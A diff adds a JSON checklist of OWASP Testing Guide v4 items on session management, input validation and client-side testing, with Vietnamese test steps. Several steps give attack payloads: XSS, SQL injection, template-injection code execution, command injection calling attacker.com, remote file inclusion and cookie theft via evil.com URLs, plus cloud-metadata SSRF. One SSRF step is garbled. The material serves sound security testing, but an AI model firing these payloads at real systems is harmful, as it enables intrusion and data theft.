@@ -1,0 +1,289 @@
+[
+  {
+    "stt": 41,
+    "code": "OTG-SESS-001",
+    "task": "Testing for Bypassing Session Management Schema",
+    "detail": "Kiểm tra cơ chế quản lý session.\r\nCách test:\r\n1. Phân tích cookie: tên, cấu trúc, format.\r\n2. Cookie có thể dự đoán? (timestamp, hash của username, IP).\r\n3. Cookie có đủ entropy không? (dùng Burp Sequencer).\r\n4. Session ID có được refresh sau login không?\r\n5. Session ID có secure random không? (thử 100 request, phân tích pattern).",
+    "reference": "https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf"
+  },
+  {
+    "stt": 42,
+    "code": "OTG-SESS-002",
+    "task": "Testing for Cookies attributes",
+    "detail": "Kiểm tra thuộc tính cookie.\r\nCách test:\r\n1. Cookie có Secure flag không? (chỉ gửi qua HTTPS).\r\n2. Cookie có HttpOnly flag không? (không cho JS đọc).\r\n3. Cookie có SameSite flag không? (Strict/Lax/None).\r\n4. Cookie có Path attribute đúng không?\r\n5. Cookie có Domain attribute quá rộng không? (target.com thay vì api.target.com).\r\n6. Cookie có Expires/Max-Age phù hợp không?",
+    "reference": "https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf"
+  },
+  {
+    "stt": 43,
+    "code": "OTG-SESS-003",
+    "task": "Testing for Session Fixation",
+    "detail": "Kiểm tra session fixation.\r\nCách test:\r\n1. Ghi nhận session cookie trước khi login.\r\n2. Login → kiểm tra session cookie có thay đổi không?\r\n3. Nếu cookie không đổi → có thể set cookie cho victim, victim login → attacker dùng cookie cũ.\r\n4. Kiểm tra logout có clear session và tạo session mới không?\r\n5. Kiểm tra có thể set session qua URL parameter? (PHP?sessionid=abc).",
+    "reference": "https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf"
+  },
+  {
+    "stt": 44,
+    "code": "OTG-SESS-004",
+    "task": "Testing for Exposed Session Variables",
+    "detail": "Kiểm tra session variable bị lộ.\r\nCách test:\r\n1. Kiểm tra URL query string có session ID không? (http://target.com/?session=abc).\r\n2. Kiểm tra hidden fields có session token không?\r\n3. Kiểm tra Referer header có lộ session ID không?\r\n4. Kiểm tra log files, error pages có in session ID không?\r\n5. Kiểm tra session ID trong HTML source code.",
+    "reference": "https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf"
+  },
+  {
+    "stt": 45,
+    "code": "OTG-SESS-005",
+    "task": "Testing for Cross Site Request Forgery",
+    "detail": "Kiểm tra CSRF.\r\nCách test:\r\n1. Xác định các sensitive action: change password, transfer money, change email.\r\n2. Kiểm tra mỗi request có CSRF token không?\r\n3. Token có thể dự đoán? (cùng token cho nhiều request, token không thay đổi).\r\n4. Có thể bypass: thay POST→GET, xóa header Content-Type, xóa token parameter?\r\n5. Kiểm tra SameSite cookie: nếu SameSite=None + CSRF token yếu → vulnerable.\r\n6. Kiểm tra double submit cookie: có thể đặt cookie tùy ý?\r\n7. Tạo PoC HTML: tự động submit form.",
+    "reference": "https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf"
+  },
+  {
+    "stt": 46,
+    "code": "OTG-SESS-006",
+    "task": "Testing for Logout Functionality",
+    "detail": "Kiểm tra chức năng logout.\r\nCách test:\r\n1. Sau logout, click Back → có thấy page cũ không? (cần redirect login).\r\n2. Cookie có bị xóa hoàn toàn không?\r\n3. Session server-side có bị destroy không? (sử dụng cookie cũ → còn valid?).\r\n4. Nút logout có thực sự gửi request logout không? (hay chỉ JS redirect?).\r\n5. Kiểm tra CSRF trên logout (attacker có thể logout victim).",
+    "reference": "https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf"
+  },
+  {
+    "stt": 47,
+    "code": "OTG-SESS-007",
+    "task": "Testing Session Timeout",
+    "detail": "Kiểm tra thời gian timeout session.\r\nCách test:\r\n1. Login → đợi 15-30 phút không hoạt động → thử request.\r\n2. Kiểm tra idle timeout: có tự động logout sau thời gian không hoạt động?\r\n3. Kiểm tra absolute timeout: có force logout sau 24h dù có hoạt động?\r\n4. Kiểm tra timeout cho remember me cookie (nên có).\r\n5. Kiểm tra token refresh có timeout hợp lý không?",
+    "reference": "https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf"
+  },
+  {
+    "stt": 48,
+    "code": "OTG-SESS-008",
+    "task": "Testing for Session Puzzling",
+    "detail": "Kiểm tra session variable manipulation.\r\nCách test:\r\n1. Xác định các variable lưu trong session.\r\n2. Thử override variable qua parameter: ?role=admin nếu session có 'role'.\r\n3. Thử set session variable qua API endpoint A, dùng ở endpoint B.\r\n4. Kiểm tra deserialization của session data.\r\n5. Kiểm tra có thể inject vào session storage không.",
+    "reference": "https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf"
+  },
+  {
+    "stt": 49,
+    "code": "OTG-SESS-009",
+    "task": "Testing for Session Hijacking",
+    "detail": "Kiểm tra khả năng hijack session.\r\nCách test:\r\n1. Đánh cắp cookie qua XSS → dùng cookie để impersonate victim.\r\n2. Đánh cắp session qua MITM (nếu không có HTTPS hoặc HSTS).\r\n3. Kiểm tra có thể bind session với IP / User-Agent không?\r\n4. Kiểm tra session có thể được claim từ IP khác không.\r\n5. Kiểm tra device fingerprint có được sử dụng không.\r\n6. Kiểm tra notification khi login từ thiết bị mới.",
+    "reference": "https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf"
+  },
+  {
+    "stt": 50,
+    "code": "OTG-INPVAL-001",
+    "task": "Testing for Reflected Cross Site Scripting",
+    "detail": "Kiểm tra Reflected XSS.\r\nCách test:\r\n1. Xác định input được reflected ngay trong response.\r\n2. Thử payload cơ bản: <script>alert(1)</script>\r\n3. Thử context-specific: \"><script>alert(1)</script>\r\n4. Thử event handler: <img src=x onerror=alert(1)>\r\n5. Thử bypass WAF: <img src=x onerror=alert``>\r\n6. Kiểm tra tất cả reflective parameters: search, error, query.\r\n7. Kiểm tra response Content-Type có text/html không?",
+    "reference": "https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf"
+  },
+  {
+    "stt": 51,
+    "code": "OTG-INPVAL-002",
+    "task": "Testing for Stored Cross Site Scripting",
+    "detail": "Kiểm tra Stored XSS.\r\nCách test:\r\n1. Xác định input được lưu và hiển thị cho user khác.\r\n2. Gửi payload trong: comments, profile, posts, messages.\r\n3. Kiểm tra context: <, >, \", ', & có được encode không?\r\n4. Thử payload: <script>, <img src=x onerror=>, <svg onload=>\r\n5. Kiểm tra sau khi save → load trang khác → có execute không?\r\n6. Kiểm tra admin pages: nếu admin xem → stored XSS to RAT.\r\n7. Kiểm tra blind XSS (XSS Hunter, dalfox).",
+    "reference": "https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf"
+  },
+  {
+    "stt": 52,
+    "code": "OTG-INPVAL-003",
+    "task": "Testing for HTTP Verb Tampering",
+    "detail": "Kiểm tra HTTP verb tampering.\r\nCách test:\r\n1. Xác định endpoint bảo vệ: GET cần auth, nhưng POST/PUT/DELETE không.\r\n2. Thử tất cả HTTP methods: GET, POST, PUT, DELETE, PATCH, OPTIONS, HEAD.\r\n3. Thử method override: X-HTTP-Method-Override: DELETE\r\n4. Ví dụ: /api/users/123 → GET (view), DELETE (xóa) - có auth cho DELETE không?\r\n5. Kiểm tra CORS preflight request: OPTIONS có skip auth không?",
+    "reference": "https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf"
+  },
+  {
+    "stt": 53,
+    "code": "OTG-INPVAL-004",
+    "task": "Testing for HTTP Parameter Pollution",
+    "detail": "Kiểm tra HTTP Parameter Pollution (HPP).\r\nCách test:\r\n1. Xác định parameter: ?user=123\r\n2. Thử nhiều giá trị: ?user=123&user=admin\r\n3. Kiểm tra server lấy giá trị nào: first, last, union?\r\n4. Thử với các nền tảng: PHP (last), ASP.NET (first + comma), JSP (first).\r\n5. Thử bypass security: ?role=user&role=admin\r\n6. Thử với POST body: user=123&user=admin",
+    "reference": "https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf"
+  },
+  {
+    "stt": 54,
+    "code": "OTG-INPVAL-005",
+    "task": "Testing for SQL Injection",
+    "detail": "Kiểm tra SQL Injection (bao gồm nhiều DB: Oracle, MySQL, SQL Server, PostgreSQL).\r\nCách test:\r\n1. Xác định parameter gửi đến database.\r\n2. Thử payload: ' OR '1'='1, \" OR \"1\"=\"1, 1 OR 1=1\r\n3. Thử error-based: ' AND 1=1--, ' AND 1=0-- (so sánh response).\r\n4. Thử UNION: ' UNION SELECT 1,2,3-- (xác định số cột).\r\n5. Thử time-based: ' WAITFOR DELAY '0:0:5'-- (SQL Server), SLEEP(5) (MySQL).\r\n6. Thử blind SQLi: ' AND (SELECT 1 FROM users LIMIT 1)='1\r\n7. Thử NoSQLi (MongoDB): ' $where: '1'=='1, {\"$ne\": \"\"}\r\n8. Thử ORM injection: query parameters manipulation.\r\n9. Thử second-order SQLi: input được lưu → dùng trong query khác.",
+    "reference": "https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf"
+  },
+  {
+    "stt": 55,
+    "code": "OTG-INPVAL-006",
+    "task": "Testing for LDAP Injection",
+    "detail": "Kiểm tra LDAP Injection.\r\nCách test:\r\n1. Tìm endpoint có LDAP query: login, search user.\r\n2. Thử payload: * (trả về tất cả), admin* (wildcard).\r\n3. Thử: )(|(uid=*)) (bypass auth).\r\n4. Thử: admin)(|(password=*)) (injection trong filter).\r\n5. Sử dụng tool: JXplorer, LDAP browser.",
+    "reference": "https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf"
+  },
+  {
+    "stt": 56,
+    "code": "OTG-INPVAL-007",
+    "task": "Testing for XML Injection",
+    "detail": "Kiểm tra XML Injection.\r\nCách test:\r\n1. Xác định endpoint nhận XML input (SOAP API, REST với XML body).\r\n2. Thử XML special characters: < > & ' \" trong data.\r\n3. Thử XPath injection: ' or '1'='1\r\n4. Thử XML External Entity (XXE) - xem ERRH section.\r\n5. Kiểm tra XML parser có resistant với XML bombs không?",
+    "reference": "https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf"
+  },
+  {
+    "stt": 57,
+    "code": "OTG-INPVAL-008",
+    "task": "Testing for SSI Injection",
+    "detail": "Kiểm tra Server-Side Includes Injection.\r\nCách test:\r\n1. Tìm input được include vào file .shtml, .stm, .shtm.\r\n2. Thử payload: <!--#echo var=\"DOCUMENT_NAME\" -->\r\n3. Thử exec: <!--#exec cmd=\"ls -la\" -->\r\n4. Thử include: <!--#include virtual=\"/etc/passwd\" -->\r\n5. SSI thường gặp ở legacy Apache servers.",
+    "reference": "https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf"
+  },
+  {
+    "stt": 58,
+    "code": "OTG-INPVAL-009",
+    "task": "Testing for XPath Injection",
+    "detail": "Kiểm tra XPath Injection.\r\nCách test:\r\n1. Tìm endpoint dùng XPath query (XML-based auth, search).\r\n2. Thử: ' or '1'='1, ' and '1'='2\r\n3. Thử union: x' | /root/* | '\r\n4. XPath 2.0+: ' or fn:true() and ''='\r\n5. Mục tiêu: bypass auth hoặc extract toàn bộ XML document.",
+    "reference": "https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf"
+  },
+  {
+    "stt": 59,
+    "code": "OTG-INPVAL-010",
+    "task": "Testing for IMAP/SMTP Injection",
+    "detail": "Kiểm tra IMAP/SMTP Injection.\r\nCách test:\r\n1. Tìm endpoint gửi email (contact, forgot password, invite).\r\n2. Thử injection vào email fields.\r\n3. SMTP: thêm \\r\\nCc: victim@target.com, \\r\\nBcc: attacker@evil.com\r\n4. IMAP: thử ' or 1=1 (nếu IMAP search có injection).\r\n5. Kiểm tra có thể spam email (thêm nhiều CC/BCC).",
+    "reference": "https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf"
+  },
+  {
+    "stt": 60,
+    "code": "OTG-INPVAL-011",
+    "task": "Testing for Code Injection",
+    "detail": "Kiểm tra Code Injection (Local/Remote File Inclusion).\r\nCách test:\r\n1. Tìm parameter dùng trong include/require (PHP, JSP, ASP).\r\n2. LFI: ../../../etc/passwd, php://filter/convert.base64-encode/resource=config\r\n3. RFI: http://attacker.com/shell.txt? (allow_url_include=On).\r\n4. Thử eval injection: param=1; system('id');\r\n5. Thử dynamic function: param=phpinfo()\r\n6. Kiểm tra JSP include: ?file=/WEB-INF/web.xml",
+    "reference": "https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf"
+  },
+  {
+    "stt": 61,
+    "code": "OTG-INPVAL-012",
+    "task": "Testing for Command Injection",
+    "detail": "Kiểm tra Command Injection.\r\nCách test:\r\n1. Tìm input được đưa vào shell/system command.\r\n2. Thử: ; ls -la (Linux), | dir (Windows).\r\n3. Thử: $(whoami), `whoami` (command substitution).\r\n4. Thử: || whoami, && whoami (bypass).\r\n5. Thử blind: ; sleep 5 (time-based detection).\r\n6. Thử OOB: ; nslookup attacker.com\r\n7. Kiểm tra endpoints: ping, traceroute, nslookup, host, whois.",
+    "reference": "https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf"
+  },
+  {
+    "stt": 62,
+    "code": "OTG-INPVAL-013",
+    "task": "Testing for Format String Injection",
+    "detail": "Kiểm tra Format String Injection.\r\nCách test:\r\n1. Tìm input dùng trong printf-family functions (C/C++).\r\n2. Thử: %s%s%s%s%s (stack leak), %x%x%x%x (memory read).\r\n3. Thử: %n (write to memory - RCE potential).\r\n4. Thử: %08x.%08x.%08x.%08x (dump stack).\r\n5. Format string thường gặp ở C/C++ ứng dụng, legacy code.",
+    "reference": "https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf"
+  },
+  {
+    "stt": 63,
+    "code": "OTG-INPVAL-014",
+    "task": "Testing for Incubated Vulnerability",
+    "detail": "Kiểm tra stored vulnerability (second-order).\r\nCách test:\r\n1. Lưu input độc hại vào database (profile, comment, post).\r\n2. Input sau đó được xử lý bởi component khác (admin panel, report, email).\r\n3. Thử script qua stored XSS → admin xem → script chạy.\r\n4. Thử SQLi qua stored input → query khác chạy.\r\n5. Thử file upload → virus scan → file được open → execution.\r\n6. Kiểm tra tất cả second-order processing.",
+    "reference": "https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf"
+  },
+  {
+    "stt": 64,
+    "code": "OTG-INPVAL-015",
+    "task": "Testing for HTTP Splitting/Smuggling",
+    "detail": "Kiểm tra HTTP Response Splitting / Request Smuggling.\r\nCách test:\r\n1. Response Splitting: thử \\r\\n trong redirect URL.\r\n2. Request Smuggling: gửi request với Content-Length + Transfer-Encoding.\r\n3. CL.TE: Content-Length: 13 + Transfer-Encoding: chunked → smuggled request.\r\n4. TE.CL: Transfer-Encoding: chunked + Content-Length → opposite.\r\n5. TE.TE: obfuscate Transfer-Encoding header.\r\n6. Kiểm tra behavior với: Transfer-Encoding: xchunked (malformed).\r\n7. Smuggling thường gặp giữa CDN/Load Balancer và origin server.",
+    "reference": "https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf"
+  },
+  {
+    "stt": 65,
+    "code": "OTG-INPVAL-016",
+    "task": "Testing for HTTP Incoming Requests",
+    "detail": "Kiểm tra HTTP request validation.\r\nCách test:\r\n1. Gửi request với malformed headers.\r\n2. Thử Content-Type khác: text/plain, application/xml.\r\n3. Thử charset khác: UTF-16, ISO-8859-1, UTF-7.\r\n4. Thử Transfer-Encoding: chunked với regular request.\r\n5. Kiểm tra server handle header folding: Header: value\\n\\svalue.\r\n6. Kiểm tra request size limit và behavior khi vượt quá.",
+    "reference": "https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf"
+  },
+  {
+    "stt": 66,
+    "code": "OTG-INPVAL-017",
+    "task": "Testing for Host Header Injection",
+    "detail": "Kiểm tra Host Header Injection.\r\nCách test:\r\n1. Gửi request với Host: evil.com thay vì Host: target.com.\r\n2. Kiểm tra response có chứa evil.com không? (in link, redirect).\r\n3. Cache poisoning: Host header quyết định cache key.\r\n4. Password reset: link reset dùng Host header → redirect đến evil.com.\r\n5. Web cache poisoning: Host header poison cache.\r\n6. Thử với X-Forwarded-Host, X-Forwarded-Server header.",
+    "reference": "https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf"
+  },
+  {
+    "stt": 67,
+    "code": "OTG-INPVAL-018",
+    "task": "Testing for Server-side Template Injection",
+    "detail": "Kiểm tra Server-Side Template Injection (SSTI).\r\nCách test:\r\n1. Xác định input được template engine xử lý (Jinja2, Twig, Freemarker, Velocity).\r\n2. Thử payload: {{7*7}}, ${7*7}, #{7*7}.\r\n3. Nếu kết quả là 49 → SSTI.\r\n4. Jinja2 RCE: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}\r\n5. Freemarker: <#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}\r\n6. Thử trong các template parameter, email templates, notification.",
+    "reference": "https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf"
+  },
+  {
+    "stt": 68,
+    "code": "OTG-INPVAL-019",
+    "task": "Testing for Server-Side Request Forgery",
+    "detail": "Kiểm tra Server-Side Request Forgery (SSRF).\r\nCách test:\r\n1. Xác định endpoint nhận URL làm input (fetch image, import, webhook).\r\n2. Thử internal IP: http://127.0.0.1, http://localhost, http://169.254.169.254/\r\n3. Thử protocol: file:///etc/passwd, gopher://, dict://\r\n4. Thử DNS: setup bone.threat (Biip) + Burp Collaborator.\r\n5. Blind SSRF: gửi URL đến Collaborator → kiểm tra callback.\r\n6. Cloud metadata: http://169.254.169.254/latest/meta-data/ (AWS).\r\n7. Kiểm tra redirect: http://evil.com/redirect?url=http://169.254.169.254/",
+    "reference": "https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf"
+  },
+  {
+    "stt": 84,
+    "code": "OTG-CLIENT-001",
+    "task": "Testing for DOM-Based Cross Site Scripting",
+    "detail": "Kiểm tra DOM-based XSS.\r\nCách test:\r\n1. Xác định JavaScript đọc từ DOM: document.location, document.URL, window.name.\r\n2. Kiểm tra sink: innerHTML, document.write, eval, setTimeout với string.\r\n3. Thử payload trong #hash: http://target.com/#<script>alert(1)</script>\r\n4. Thử URL parameter: ?q=<script>alert(1)</script>\r\n5. Sử dụng Burp DOM Invader để tự động detect.\r\n6. Kiểm tra postMessage handler có validate origin không?",
+    "reference": "https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf"
+  },
+  {
+    "stt": 85,
+    "code": "OTG-CLIENT-002",
+    "task": "Testing for JavaScript Execution",
+    "detail": "Kiểm tra JavaScript injection qua eval, setTimeout, setInterval.\r\nCách test:\r\n1. Tìm input được đưa vào eval(), setTimeout().\r\n2. Thử: ' + eval('alert(1)') + '\r\n3. Kiểm tra Function constructor: new Function('return alert(1)')()\r\n4. Kiểm tra setInterval/setTimeout với string: setTimeout('alert(\"1\")').\r\n5. Kiểm tra dynamic script loading: createElement('script').",
+    "reference": "https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf"
+  },
+  {
+    "stt": 86,
+    "code": "OTG-CLIENT-003",
+    "task": "Testing for HTML Injection",
+    "detail": "Kiểm tra HTML Injection.\r\nCách test:\r\n1. Tìm input được reflected vào HTML context.\r\n2. Thử: <h1>Test</h1>, <b>Bold</b>, <img src=x>\r\n3. Kiểm tra có filter không? Lọc <script> nhưng không lọc <img>, <svg>.\r\n4. Thử: <svg onload=alert(1)>, <body onload=alert(1)>\r\n5. Kiểm tra CSS injection: <div style=\"background:url(javascript:alert(1))\">",
+    "reference": "https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf"
+  },
+  {
+    "stt": 87,
+    "code": "OTG-CLIENT-004",
+    "task": "Testing for Client-side URL Redirect",
+    "detail": "Kiểm tra open redirect trên client-side.\r\nCách test:\r\n1. Tìm JavaScript redirect: window.location = param, window.open(param).\r\n2. Thử: ?redirect=https://evil.com, ?url=//evil.com, ?next=../evil\r\n3. Thử protocol: javascript:alert(1), data:text/html,<script>alert(1)</script>\r\n4. Thử URL encoding: %68%74%74%70%73%3a%2f%2f (mã hóa hex).\r\n5. Nếu open redirect → kết hợp với phishing attack.\r\n6. Meta refresh: <meta http-equiv=\"refresh\" content=\"0;url=evil.com\">",
+    "reference": "https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf"
+  },
+  {
+    "stt": 88,
+    "code": "OTG-CLIENT-005",
+    "task": "Testing for CSS Injection",
+    "detail": "Kiểm tra CSS Injection.\r\nCách test:\r\n1. Tìm input được reflected trong CSS context.\r\n2. Thử: background:url(http://evil.com/steal?cookie=\r\n3. Thử: expression(alert(1)) (IE only, legacy).\r\n4. Kiểm tra CSS selector injection: có thể manipulate CSS selector.\r\n5. Thử exfiltrate dữ liệu: input[value^=\"a\"]{background:url(/?char=a)}\r\n6. Kiểm tra @import url injection.",
+    "reference": "https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf"
+  },
+  {
+    "stt": 89,
+    "code": "OTG-CLIENT-006",
+    "task": "Testing for Client-side Resource Manipulation",
+    "detail": "Kiểm tra client-side resource manipulation.\r\nCách test:\r\n1. Tìm input dùng làm URL cho resource: img src, script src, link href.\r\n2. Thử thay đổi URL resource đến evil.com.\r\n3. Kiểm tra CSP có allow chưa? (script-src 'self' có dễ bypass không).\r\n4. Thử sử dụng //evil.com (protocol-relative URL).\r\n5. Kiểm tra JSONP callback injection.",
+    "reference": "https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf"
+  },
+  {
+    "stt": 90,
+    "code": "OTG-CLIENT-007",
+    "task": "Testing Cross Origin Resource Sharing",
+    "detail": "Kiểm tra CORS.\r\nCách test:\r\n1. Gửi request với Origin: https://evil.com\r\n2. Kiểm tra response Access-Control-Allow-Origin.\r\n3. Nếu trả về evil.com + Access-Control-Allow-Credentials: true → data theft.\r\n4. Kiểm tra Access-Control-Allow-Origin: * (wildcard).\r\n5. Kiểm tra null origin: Origin: null → Access-Control-Allow-Origin: null.\r\n6. Kiểm tra preflight OPTIONS request.\r\n7. Kiểm tra Vary: Origin header có được set không.",
+    "reference": "https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf"
+  },
+  {
+    "stt": 91,
+    "code": "OTG-CLIENT-008",
+    "task": "Testing for Cross Site Flashing",
+    "detail": "Kiểm tra Cross-Site Flashing (Flash-based).\r\nCách test:\r\n1. Tìm file .swf có thể bị inject param.\r\n2. Kiểm tra Flash's allowScriptAccess parameter.\r\n3. Thử getURL / navigateToURL với JavaScript.\r\n4. Kiểm tra crossdomain.xml có allow-access-from domain rộng không.\r\n5. Sử dụng tool: SWFScan, Flare, JPEXS Flash Decompiler.\r\n6. Lưu ý: Flash không còn được hỗ trợ từ 2021, nhưng legacy app có thể còn.",
+    "reference": "https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf"
+  },
+  {
+    "stt": 92,
+    "code": "OTG-CLIENT-009",
+    "task": "Testing for Clickjacking",
+    "detail": "Kiểm tra Clickjacking.\r\nCách test:\r\n1. Kiểm tra response header: X-Frame-Options (DENY/SAMEORIGIN).\r\n2. Kiểm tra CSP: frame-ancestors 'none'/'self'.\r\n3. Tạo PoC HTML: <iframe src=\"https://target.com/login\" width=\"500\" height=\"500\"></iframe>\r\n4. Nếu page load trong iframe → vulnerable to clickjacking.\r\n5. Kiểm tra sensitive actions: clickjacking transfer money, change password.\r\n6. Kiểm tra có sử dụng framebreaker JavaScript không? (có thể bypass).",
+    "reference": "https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf"
+  },
+  {
+    "stt": 93,
+    "code": "OTG-CLIENT-010",
+    "task": "Testing WebSockets",
+    "detail": "Kiểm tra bảo mật WebSocket.\r\nCách test:\r\n1. Xác định WebSocket connection (ws:// hoặc wss://).\r\n2. Kiểm tra WebSocket handshake có authentication không?\r\n3. Kiểm tra message có được validate không (injection).\r\n4. Thử CSRF trên WebSocket (no SameSite on WebSocket).\r\n5. Thử gửi message độc hại qua WebSocket.\r\n6. Kiểm tra rate limiting trên WebSocket messages.\r\n7. Kiểm tra có thể subscribe đến channel của user khác không?",
+    "reference": "https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf"
+  },
+  {
+    "stt": 94,
+    "code": "OTG-CLIENT-011",
+    "task": "Testing Web Messaging",
+    "detail": "Kiểm tra postMessage security.\r\nCách test:\r\n1. Tìm postMessage event listener trong JavaScript.\r\n2. Kiểm tra có validate message origin không? (event.origin).\r\n3. Thử gửi message từ iframe độc hại.\r\n4. Kiểm tra có validate message data không? (JSON.parse không an toàn).\r\n5. Kiểm tra có thể inject HTML/eval qua message không.\r\n6. Kiểm tra có thể access sensitive data qua message không.",
+    "reference": "https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf"
+  },
+  {
+    "stt": 95,
+    "code": "OTG-CLIENT-012",
+    "task": "Testing Browser Storage",
+    "detail": "Kiểm tra lưu trữ browser-side.\r\nCách test:\r\n1. Kiểm tra localStorage, sessionStorage có chứa sensitive data không?\r\n2. Kiểm tra IndexedDB, Web SQL có chứa PII/token không.\r\n3. Kiểm tra cookie có HttpOnly không? (nếu không → JS có thể đọc).\r\n4. Kiểm tra access token có lưu trong localStorage không? (XSS → stolen).\r\n5. Kiểm tra có xóa storage sau logout không?\r\n6. Kiểm tra có secure flag trên HTTP cookie không.",
+    "reference": "https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf"
+  },
+  {
+    "stt": 96,
+    "code": "OTG-CLIENT-013",
+    "task": "Testing for Cross Site Script Inclusion",
+    "detail": "Kiểm tra XSSI (Cross-Site Script Inclusion).\r\nCách test:\r\n1. Kiểm tra sensitive data được serve qua JavaScript file không?\r\n2. Kiểm tra có thể include JSON/JS từ external domain không.\r\n3. Thử: <script src=\"https://target.com/api/user/123\"></script>\r\n4. Nếu API trả về JSON mà không có proper protection → script tag có thể đọc.\r\n5. Kiểm tra protection: while(1) prefix, X-Content-Type-Options: nosniff.\r\n6. Kiểm trang JSONP endpoint có callback injection không.",
+    "reference": "https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf"
+  }
+]
